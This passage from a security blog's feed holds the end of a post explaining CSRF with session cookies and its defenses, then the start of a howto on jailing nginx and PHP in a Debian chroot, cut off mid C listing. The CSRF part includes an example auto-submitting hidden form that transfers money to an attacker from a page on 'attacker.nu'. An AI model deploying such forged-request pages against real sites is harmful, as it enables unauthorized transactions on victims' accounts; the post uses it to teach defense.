    Attacker -&gt; Client [label=&quot;Send some link&quot;];
    
    // Separator
    === User clicks on link. Browser will start ===
    ... Client opens malicious link ...
    
    // Separator
    === Malicious site will trigger some request to the server ===
    
    Client -&gt; Server [label=&quot;GET /change-account-settings&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx02.png" alt=""></p>
<h2 id="some-example">Some example</h2>
<p>Now let&rsquo;s think of some <strong>real-world</strong> example. User <strong>Bob</strong> has an account on <code>http://bank.nu</code>. Attacker <strong>Victor</strong> will prepare a site <code>http://attacker.nu</code> which once accessed will load following <strong>iframe</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.html" data-lang=".html">&lt;<span style="color:#6ab825;font-weight:bold">iframe</span> <span style="color:#bbb">style</span>=<span style="color:#ed9d13">&#34;display:none&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;csrf-frame&#34;</span>&gt;&lt;/<span style="color:#6ab825;font-weight:bold">iframe</span>&gt;
&lt;<span style="color:#6ab825;font-weight:bold">form</span> <span style="color:#bbb">action</span>=<span style="color:#ed9d13">&#34;http://bank.nu/transfer.do&#34;</span> <span style="color:#bbb">method</span>=<span style="color:#ed9d13">&#34;POST&#34;</span> <span style="color:#bbb">id</span>=<span style="color:#ed9d13">&#34;csrf-form&#34;</span>&gt;
    &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;hidden&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;acct&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;Victor&#34;</span>/&gt;
    &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;hidden&#34;</span> <span style="color:#bbb">name</span>=<span style="color:#ed9d13">&#34;amount&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;10.000&#34;</span>/&gt;
    &lt;<span style="color:#6ab825;font-weight:bold">input</span> <span style="color:#bbb">type</span>=<span style="color:#ed9d13">&#34;submit&#34;</span> <span style="color:#bbb">value</span>=<span style="color:#ed9d13">&#34;View my pictures&#34;</span>/&gt;
&lt;/<span style="color:#6ab825;font-weight:bold">form</span>&gt;
&lt;<span style="color:#6ab825;font-weight:bold">script</span>&gt;<span style="color:#24909d">document</span>.getElementById(<span style="color:#ed9d13">&#34;csrf-form&#34;</span>).submit()&lt;/<span style="color:#6ab825;font-weight:bold">script</span>&gt;
</code></pre></div><p>In this case the <strong>iframe</strong> ins&rsquo;t visible at all (<code>display:none</code>) and some JavaScript will trigger the submission of the form once the <code>script</code>tag is loaded aka the user enters the site. In this fictional example the form will trigger a <code>POST</code> request which will <strong>transfer</strong> some money to the <strong>attacker</strong> (Victor). Next the <strong>attacker</strong> will send <strong>Bob</strong> a mail with a link to his site <code>http://attacker.nu</code>. Bob will click on this link and the browser will open the link. Untill now nothing happens. Once the browser will load the attackers site, the whole <strong>voodoo</strong> behind CSRF would take place.</p>
<h2 id="csrf-fundamentals">CSRF fundamentals</h2>
<p>At this point I&rsquo;d like to slow down things a little bit and focus on some details. In the past people have asked me some questions or made some observations regarding the whole process. Among these (I tried to apply the questions/observations to the previous example):</p>
<ol>
<li><em>&ldquo;In a iframe you are able to load stuff (javascript, images etc.) via GET. How do you trigger a <strong>POST</strong> request at all?&quot;</em></li>
<li><em>&ldquo;The attackers site is not authentificated to <code>http://bank.nu</code>. Your triggered request is not going to work at all.&quot;</em></li>
<li><em>&ldquo;Why should the browser trigger the request once the user visits the attackers site?&quot;</em></li>
<li><em>&ldquo;We do protect the session cookies by <code>httponly</code> and the <code>secure</code> flag. Why do you think this is going to work?&quot;</em></li>
</ol>
<p>Well first let&rsquo;s see <strong>why</strong> this kind of attacks are so powerful. Apparently Bob can only trigger the transaction if he has a <strong>valid session</strong>. Otherwise the bank would
show some error message that the request is not allowed and a valid session is necessary. The authentification process usually looks like this:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    edge_length = 600;
    Client
    Server;
    Client -&gt; Server [label=&quot;POST /login&quot;];
    Server -&gt; Client [label=&quot;200 OK\nSet-Cookie: session=xxxx&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx03.png" alt=""></p>
<p>The user sends his credentials to the server, the server validates these and sends a <strong>cookie</strong> to the client which serves as authentification characteristic.
Regardless of the expiration time of the cookie, <strong>every time</strong> the browser/client makes a request to the server, the cookie will be sent <strong>automatically</strong> to the server.
This is a very important one and <strong>often misunderstood</strong> by non-sec people.</p>
<p>So next time the user wants to visit the site again, the browser will <strong>add</strong> the cookies received from the server to the request:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    edge_length = 600;
    Client
    Server;
    Client -&gt; Server [label=&quot;GET /myaccount\nCookie: session=xxxx\nCookie: bla=foo&quot;];
    Server -&gt; Client [label=&quot;200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx04.png" alt=""></p>
<p>That in turn means that every time a request is conducted by your browser - whether intended by the user or not - the session cookie will be <strong>always</strong> be sent
along with the request.</p>
<h2 id="the-attack">The attack</h2>
<p>Recalling a few thoughts made some sentences ago, the attack will consist of following steps:</p>
<ol>
<li>Send a malicious link to <strong>Bob</strong></li>
<li>Bob will click the link and the browser will open the malicious site</li>
<li>The malicious site will trigger a <strong>POST</strong> request to <code>http://bank.nu</code> and try to make a money transfer</li>
<li>This is going to work <strong>only and if</strong> Bob is logged in (has a valid session cookie) on the bank site</li>
</ol>
<p>Trying to be more precise, these are the requests made:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    Attacker;
    User; 
    Site [label=&quot;http://attacker.nu&quot;];
    Bank [label=&quot;http://bank.nu&quot;];
    Attacker -&gt; User [label=&quot;Send link&quot;];
    
    ... User opens the link ...
    User -&gt; Site;
    Site -&gt; Bank [label=&quot;POST /transfer.do\nHost: bank.nu\nCookie: session=xxxx&quot;, note = &quot;Request is automatically triggered&quot;];
    Bank -&gt; Site [label=&quot;200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx05.png" alt=""></p>
<p>As you have noticed the <strong>session cookie</strong> is part of the POST request. The attackers site <strong>can&rsquo;t</strong> read the cookie due to several reasons:</p>
<ul>
<li>the <strong>domain</strong> attribute of the cookie restricts the availability of the cookie only to the <code>bank.nu</code> domain
<ul>
<li>that means that the browser will only set the cookie if the request is made to <code>bank.nu</code></li>
</ul>
</li>
<li>the <strong>httpOnly</strong> flag is set
<ul>
<li>no JavaScript can read the cookie</li>
</ul>
</li>
</ul>
<p>But the attacker doesn&rsquo;t have to know the cookie. In the case of CSRF he/she will fire up a request assuming that the victim is <strong>authentificated</strong> against <code>bank.nu</code>. If not, the
attack will have no consequences since the POST request won&rsquo;t be accepted by the server.</p>
<h2 id="the-defense">The defense</h2>
<p>Since it is the <strong>natural</strong> behaviour of the browser to add the cookies to some specific requests (in order to tell the server that the user is authentificated),
the mitigation of such attacks has to be done somewhere else. The <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern">generic solution</a> consists of adding some <strong>random secure token</strong> which has to be:</p>
<ul>
<li>unique per user/session</li>
<li>tied to only <strong>one</strong> session</li>
<li>generated by a secure PRNG</li>
</ul>
<p>The <strong>client</strong> has to provide this token in its requests. The server will reject the request/action if the token is not valid. Sounds simple, isn&rsquo;t it? There are two ways to do it:</p>
<h3 id="provide-the-token-in-a-hidden-field-synchronizer-token-pattern">Provide the token in a hidden field (Synchronizer Token Pattern)</h3>
<p>If the client wants to perform an action (like sending a POST request), the server will put inside the <strong>body</strong> content a hidden token which the client has to provide when sending the POST request:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    edge_length = 600;
    Client -&gt; Server [label=&quot;GET /transfer&quot;];
    Server -&gt; Client [label=&quot;200 OK\n\n&lt;form token='xxx'&gt;&quot;];
    Client -&gt; Server [label=&quot;POST /transfer.do\n\n[...]&amp;token=xxx&quot;];
    Server -&gt; Client [label=&quot;200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx06.png" alt=""></p>
<p>The token should change every time the site is loaded again. That means that the server should <strong>not</strong> accept 2 POST requests with the <strong>same</strong> token value.</p>
<h3 id="provide-session-based-csrf-token-double-submit-cookies">Provide session based CSRF token (Double Submit Cookies)</h3>
<p>Once the client has authentificated against the server, the server will send the client a CSRF token which will be used for <strong>every</strong> request. The token value <strong>doesn&rsquo;t change</strong> and remains the same for the whole session.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    edge_length = 600;
    Client -&gt; Server [label=&quot;POST /login&quot;];
    Server -&gt; Client [label=&quot;200 OK\nSet-Cookie: session=xxx\nSet-Cookie: token=yyy&quot;];
    
    ... Client does some actions ...
    
    Client -&gt; Server [label=&quot;POST /transfer.do\nCookie: token=yyy\nCookie: session=xxx\n\n[...]&amp;token=yyy&quot;];
    Server -&gt; Client [label=&quot;200 OK&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx07.png" alt=""></p>
<p>The interesting thing about this approach is the fact that the token is sent <strong>twice</strong>. The CSRF token is being sent to the client as a <em>cookie</em>.
That means that this specific cookie will be sent automatically by the browser when some requests are triggered (<strong>natural</strong> behaviour, remember?).
At first look this approach doesn&rsquo;t look secure, since the <strong>session</strong> cookie <strong>and</strong> the <strong>csrf</strong> token will be sent automatically by the browser
in case of a <strong>forged</strong> request. Remember that the <strong>attacker</strong> doesn&rsquo;t have to know the cookie values. He/she just <strong>forges</strong> the request and since the
server can&rsquo;t distinguish between a <strong>legitimate</strong> and a <strong>forged</strong> request, the attack will be successful.</p>
<p>However, in the <em>Double Submit Cookies</em> approach the token value <strong>has</strong> to be sent more than once: Either as a <em>GET</em> or <em>POST</em> parameter. So the big question here is: Why is this secure? Well due to the fact that the token value has to be submitted somewhere else, the attacker will have to <strong>read</strong> this value - which is <strong>not possible</strong>. The attacker <em>can</em> forge the request but he can&rsquo;t <em>get</em> the response. The reason therefore is called <strong>SOP</strong> (Same Origin Policy) and prevents <strong>cross-requests</strong> (aka from other domains) to be performed. In our case a script hosted at <code>attacker.nu</code> would <strong>not</strong>  be able to get &ldquo;ressources&rdquo; from <code>bank.nu</code> when executed in the browser.</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>seqdiag {
    edge_length = 600;
    attacker [label=&quot;attacker.nu/evil.js&quot;];
    server [label=&quot;bank.nu&quot;];
    attacker -&gt; server [label=&quot;XMLHttpRequest('http://bank.nu/transfer')&quot;];
    server -&gt; attacker [note=&quot;Server will send nothing&quot;];
}
</code></pre>

</details>

<p><img src="/posts/img/2016/some-words-on-csrf-and-cookies/xx08.png" alt=""></p>
<p>This is the reason the attacker <strong>can&rsquo;t</strong> read the token value even though he is able to <em>forge</em> requests. Providing the token value <strong>twice</strong> make this approach secure since the attacker can&rsquo;t read the token value and therefore can&rsquo;t forge a valid request (accepted by the server).</p>
<h2 id="conclusion">Conclusion</h2>
<p>There are some other patterns I&rsquo;m aware of (there might more!):</p>
<ul>
<li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#Encrypted_Token_Pattern">Encrypted Token Pattern</a></li>
<li><a href="https://docs.spring.io/spring-security/site/docs/current/reference/html/csrf.html">token interceptors</a></li>
</ul>
<p>But the most valuable &ldquo;take-home-lesson&rdquo; is not about the technical details regarding the solutions. When discussing solutions several things should be always
considered:</p>
<ul>
<li>The browser will <strong>always</strong> send available (regarding to the domain) cookies within the requests (whether its a page, JS, CSS, JPG whatever)</li>
<li>If <strong>XSS</strong> is possible, you have bigger problems
<ul>
<li><strong>SOP</strong> offers no protection anymore</li>
</ul>
</li>
<li>Make sure the CSRF token is <strong>random</strong> and <strong>unique</strong> per session</li>
<li>When storing the CSRF token as a <strong>cookie</strong>, make sure you <strong>double</strong> check the value
<ul>
<li>The client <strong>has</strong> to provide the token as a GET/POST parameter</li>
<li>Don&rsquo;t rely on the validation based on the cookie</li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Put nginx and PHP to jail in Debian 8</title>
      <link>https://blog.dornea.nu/2016/01/15/howto-put-nginx-and-php-to-jail-in-debian-8/</link>
      <pubDate>Fri, 15 Jan 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/01/15/howto-put-nginx-and-php-to-jail-in-debian-8/</guid>
      <content:encoded><![CDATA[<p>Although I thought this would be an easy task, it turned out that <strong>chrooting</strong> daemons takes more than copying config files and libraries. There are donzens of tutorials out there how to do it, but the devil lies in detail - as always. Setting up a chroot environment is easy. But securing it properly is prone to faults which in worst case could let an attacker escape the chroot. And this is your worst nightmare, right? So let&rsquo;s have a look at some more technical details.</p>
<p>For those unfamiliar with <code>chroot</code> make sure you have a look at least the <a href="https://en.wikipedia.org/wiki/Chroot">Wikipedia entry</a>.  There are also soms <a href="http://www.unixwiz.net/techtips/chroot-practices.html">chroot best practices</a> you could have a look at. Although there are better alternatives solving this job (e.g. docker) and being unable to load <strong>LSM</strong> (<a href="https://en.wikipedia.org/wiki/Linux_Security_Modules">Linux Security Modules</a>) on a vServer, putting a daemon to <em>jails</em> seems to be a pretty good approach. But there are several things one should keep in mind since <code>chroot</code> isn&rsquo;t a security feature per se (make sure you read <a href="https://securityblog.redhat.com/2013/03/27/is-chroot-a-security-feature/">&ldquo;Is chroot a security feature?&quot;</a> and <a href="https://lwn.net/Articles/252794/">&ldquo;What chroot() is really for&rdquo;</a>).</p>
<h2 id="before-starting">Before starting</h2>
<p>All the shell commands below are part of a <code>bash</code> script I use to setup a secure chroot. Use this <a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f">gist</a> to download the script files:</p>
<ul>
<li><a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-chroot-sh">chroot.sh</a></li>
<li><a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-n2chroot">n2chroot</a></li>
<li><a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-nginx-chroot">nginx-chroot</a> (to copy to <code>/etc/init.d/*</code>)</li>
<li><a href="https://gist.github.com/dorneanu/9f940b2ded9c05b5be9f#file-php5-fpm-chroot">php5-fpm-chroot</a> (to copy to <code>/etc/init.d/*</code>)</li>
</ul>
<p>Make sure you <strong>edit</strong> the files and adapt <code>BASE</code> to your <strong>chroot path</strong> (in my scripts: <code>/var/www/chroot</code>).</p>
<h2 id="unleash-the-daemons">Unleash the daemons</h2>
<p>Nowadays hosting a typical PHP application is  pretty straight-forward. Several components are necesarry:</p>
<ul>
<li>web server (<code>nginx</code>) hosting the application</li>
<li>application (<code>PHP</code>)</li>
<li>data base (<code>mysqld</code>) for storing information</li>
</ul>
<p>The <code>mysqld</code> will usually listen on <em>localhost:3306</em> and can be thus accessed by the processes inside the chroot as well. The <code>nginx</code> and the <code>PHP</code> daemons have some dependencies to be installed inside the chroot otherwise you won&rsquo;t be able to run them. For the sake of example let&rsquo;s have a look at <code>nginx</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ ldd /usr/sbin/nginx
    linux-vdso.so.1 (0x00007fffe734d000)
    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f47b5548000)
    libcrypt.so.1 =&gt; /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f47b5311000)
    libpam.so.0 =&gt; /lib/x86_64-linux-gnu/libpam.so.0 (0x00007f47b5101000)
    libexpat.so.1 =&gt; /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f47b4ed8000)
    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f47b4c6a000)
    libssl.so.1.0.0 =&gt; /usr/lib/x86_64-linux-gnu/libssl.so.1.0.0 (0x00007f47b4a09000)
    libcrypto.so.1.0.0 =&gt; /usr/lib/x86_64-linux-gnu/libcrypto.so.1.0.0 (0x00007f47b460e000)
[...]
</code></pre></div><p>So there are a lot of libraries which have to be copied into the chroot in order for the <code>nginx</code> binary to execute properly. But first, let&rsquo;s setup the basic directory structure.</p>
<h2 id="chroot-environment">chroot() environment</h2>
<p>First we&rsquo;ll create the basic directory structure and copy some basic stuff to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Create devices</span>
$ mkdir <span style="color:#40ffff">$JAIL</span>/dev
$ mknod -m <span style="color:#3677a9">0666</span> <span style="color:#40ffff">$JAIL</span>/dev/null c <span style="color:#3677a9">1</span> <span style="color:#3677a9">3</span>
$ mknod -m <span style="color:#3677a9">0666</span> <span style="color:#40ffff">$JAIL</span>/dev/random c <span style="color:#3677a9">1</span> <span style="color:#3677a9">8</span>
$ mknod -m <span style="color:#3677a9">0444</span> <span style="color:#40ffff">$JAIL</span>/dev/urandom c <span style="color:#3677a9">1</span> <span style="color:#3677a9">9</span>

<span style="color:#999;font-style:italic"># Create directories</span>
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/{etc,bin,usr,var}
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/usr/{lib,sbin,bin}
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/{run,tmp}
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/var/run

<span style="color:#999;font-style:italic"># Check if 64-bit system</span>
$ <span style="color:#6ab825;font-weight:bold">if</span> [ <span style="color:#6ab825;font-weight:bold">$(</span>uname -m<span style="color:#6ab825;font-weight:bold">)</span> = <span style="color:#ed9d13">&#34;x86_64&#34;</span> ]; <span style="color:#6ab825;font-weight:bold">then</span>
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>; ln -s usr/lib lib64
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>/usr; ln -s lib lib64
<span style="color:#6ab825;font-weight:bold">else</span>
    <span style="color:#24909d">cd</span> <span style="color:#40ffff">$JAIL</span>; ln -s usr/lib lib
<span style="color:#6ab825;font-weight:bold">fi</span>

<span style="color:#999;font-style:italic"># Copy important stuff</span>
$ cp -rfvL /etc/{services,localtime,nsswitch.conf,nscd.conf,protocols,hosts,ld.so.cache,ld.so.conf,resolv.conf,host.conf} <span style="color:#40ffff">$JAIL</span>/etc

</code></pre></div><h2 id="nginx">nginx</h2>
<p>Next we&rsquo;ll setup <code>nginx</code> and copy necessary config files and libraries:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Create directories</span>
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/usr/share/nginx
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/var/{log,lib}/nginx
$ mkdir -p <span style="color:#40ffff">$JAIL</span>/www/cgi-bin

<span style="color:#999;font-style:italic"># Copy files</span>
$ cp -r /usr/share/nginx/* <span style="color:#40ffff">$JAIL</span>/usr/share/nginx
$ cp /usr/sbin/nginx <span style="color:#40ffff">$JAIL</span>/usr/sbin/
$ cp -r /var/lib/nginx <span style="color:#40ffff">$JAIL</span>/var/lib/nginx

<span style="color:#999;font-style:italic"># Copy libraries</span>
$ <span style="color:#ed9d13">${</span><span style="color:#40ffff">N2CHROOT</span><span style="color:#ed9d13">}</span> /usr/sbin/nginx

<span style="color:#999;font-style:italic"># Copy config files and other important stuff</span>
$ cp -rfvL /etc/nginx <span style="color:#40ffff">$JAIL</span>/etc

<span style="color:#999;font-style:italic"># Create PID file</span>
$ touch <span style="color:#40ffff">$JAIL</span>/run/nginx.pid

<span style="color:#999;font-style:italic"># Copy the nginx binary</span>
$ cp /usr/sbin/nginx <span style="color:#40ffff">$JAIL</span>/usr/sbin/
</code></pre></div><h3 id="troubleshooting">Troubleshooting</h3>
<p>First let&rsquo;s see if we can run the daemon at all:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ /usr/sbin/chroot <span style="color:#40ffff">$JAIL</span> /usr/sbin/nginx -t                
nginx: [emerg] getpwnam(<span style="color:#ed9d13">&#34;www-data&#34;</span>) failed in /etc/nginx/nginx.conf:1
nginx: configuration file /etc/nginx/nginx.conf <span style="color:#24909d">test</span> failed
</code></pre></div><p>OK. Let&rsquo;s have a look at <code>strace</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">mmap(NULL, 39842, PROT_READ, MAP_PRIVATE, 5, 0) = 0x7f1d0c620000
close(5)                                = <span style="color:#3677a9">0</span>
access(<span style="color:#ed9d13">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK)      = -1 ENOENT (No such file or directory)
open(<span style="color:#ed9d13">&#34;/lib/x86_64-linux-gnu/libnss_compat.so.2&#34;</span>, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
...
exit_group(1)                           = ?
+++ exited with <span style="color:#3677a9">1</span> +++
</code></pre></div><p>Apparently <code>libnss</code> can&rsquo;t be found. Let&rsquo;s fix that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ find / -name <span style="color:#ed9d13">&#34;libnss*&#34;</span>
/lib/x86_64-linux-gnu/libnss_nis-2.19.so
/lib/x86_64-linux-gnu/libnss_compat-2.19.so
/lib/x86_64-linux-gnu/libnss_compat.so.2
/lib/x86_64-linux-gnu/libnss_nisplus.so.2
/lib/x86_64-linux-gnu/libnss_nis.so.2
/lib/x86_64-linux-gnu/libnss_files.so.2
/lib/x86_64-linux-gnu/libnss_dns.so.2
/lib/x86_64-linux-gnu/libnss_files-2.19.so
/lib/x86_64-linux-gnu/libnss_hesiod.so.2
/lib/x86_64-linux-gnu/libnss_nisplus-2.19.so
/lib/x86_64-linux-gnu/libnss_hesiod-2.19.so
/lib/x86_64-linux-gnu/libnss_dns-2.19.so
/usr/lib/x86_64-linux-gnu/libnss_nisplus.so
/usr/lib/x86_64-linux-gnu/libnss_hesiod.so
/usr/lib/x86_64-linux-gnu/libnss_compat.so
/usr/lib/x86_64-linux-gnu/libnss_files.so
/usr/lib/x86_64-linux-gnu/libnss_dns.so
/usr/lib/x86_64-linux-gnu/libnss_nis.so

<span style="color:#999;font-style:italic"># cp /lib/x86_64-linux-gnu/libnss_* $JAIL/lib/x86_64-linux-gnu/</span>
</code></pre></div><p>Let&rsquo;s give it a 2nd try:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ /usr/sbin/chroot <span style="color:#40ffff">$JAIL</span> /usr/sbin/nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf <span style="color:#24909d">test</span> is successful
</code></pre></div><h2 id="php5-fpm">php5-fpm</h2>
<p>The PHP FastCGI Process Manager (<code>php5-fpm</code>) also requires some libraries and config files that have to be available in the new <code>chroot</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Copy config files</span>
$ cp -rfvl /etc/php5 <span style="color:#40ffff">$JAIL</span>/etc/
$ cp -rfvl /usr/share/zoneinfo <span style="color:#40ffff">$JAIL</span>/usr/share/

<span style="color:#999;font-style:italic"># Copy libraries</span>
$ <span style="color:#ed9d13">${</span><span style="color:#40ffff">N2CHROOT</span><span style="color:#ed9d13">}</span> /usr/sbin/php5-fpm

<span style="color:#999;font-style:italic"># Copy the php5-fpm binary</span>
$ cp /usr/sbin/php5-fpm <span style="color:#40ffff">$JAIL</span>/usr/sbin/
</code></pre></div><p>Let&rsquo;s check if everything is ok:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ /usr/sbin/chroot <span style="color:#40ffff">$JAIL</span> /usr/sbin/php5-fpm --help
Failed loading /usr/lib/php5/20131226/opcache.so:  /usr/lib/php5/20131226/opcache.so: cannot open shared object file: No such file or directory
[11-Jan-2016 19:46:19] NOTICE: PHP message: PHP Warning:  PHP Startup: Unable to load dynamic library <span style="color:#ed9d13">&#39;/usr/lib/php5/20131226/mysqlnd.so&#39;</span> - /usr/lib/php5/20131226/mysqlnd.so: cannot open shared object file: No such file or directory in Unknown on line <span style="color:#3677a9">0</span>
[11-Jan-2016 19:46:19] NOTICE: PHP message: PHP Warning:  PHP Startup: Unable to load dynamic library <span style="color:#ed9d13">&#39;/usr/lib/php5/20131226/pdo.so&#39;</span> - /usr/lib/php5/20131226/pdo.so: cannot open shared object file: No such file or directory in Unknown on line <span style="color:#3677a9">0</span>
[11-Jan-2016 19:46:19] NOTICE: PHP message: PHP Warning:  PHP Startup: Unable to load dynamic library <span style="color:#ed9d13">&#39;/usr/lib/php5/20131226/curl.so&#39;</span> - /usr/lib/php5/20131226/curl.so: cannot open shared object file: No such file or directory in ...
</code></pre></div><p>Obviously some libraries are still missing. Let&rsquo;s fix that:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ cp -rvfl /usr/lib/php5 <span style="color:#40ffff">$JAIL</span>/usr/lib
$ <span style="color:#6ab825;font-weight:bold">for</span> f in /usr/lib/php5/20131226/*.so; <span style="color:#6ab825;font-weight:bold">do</span>
&gt;    n2chroot <span style="color:#40ffff">$f</span>
&gt; <span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><p>The <code>for</code>-loop will look at every php-module and copy its dependant libraries to the chroot.</p>
<h3 id="cant-execute-exec-shell_exec-or-system">Can&rsquo;t execute exec(), shell_exec() or system()</h3>
<p>If you experience some sort of problems like <a href="http://stackoverflow.com/questions/17006136/exec-with-php-fpm-on-nginx-under-chroot-returns-nothing">this</a> you probably have no <code>/bin/sh</code> inside your chroot (which is great after all, since we want to strip down the environment to a minimal setup). However <strong>PHP</strong>&rsquo;s functions like <code>exec()</code>, <code>shell_exec()</code> or <code>system()</code>will internally call <code>/bin/sh -c</code> to run the commands. So if your PHP application is using something like <code>sendmail</code> and you don&rsquo;t want to install any shell into your chroot, I&rsquo;ve found this <a href="https://knzl.de/setting-up-a-chroot-for-php/">solution</a> from <em>Sebastian Kienzl</em> which basically consists in providing a &ldquo;shell&rdquo; which will in turn use <code>execvp()</code> to run commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
</span><span style="color:#cd2828;font-weight:bold"></span> 
<span style="color:#cd2828;font-weight:bold">#define MAXARG 64
</span><span style="color:#cd2828;font-weight:bold"></span> 
<span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>( <span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span>* <span style="color:#6ab825;font-weight:bold">const</span> argv[] ) {
    <span style="color:#6ab825;font-weight:bold">char</span>* args[ MAXARG ] = {};
 
    <span style="color:#6ab825;font-weight:bold">if</span>( argc &lt; <span style="color:#3677a9">3</span> || strcmp( argv[<span style="color:#3677a9">1</span>], <span style="color:#ed9d13">&#34;-c&#34;</span> ) != <span style="color:#3677a9">0</span> ) {
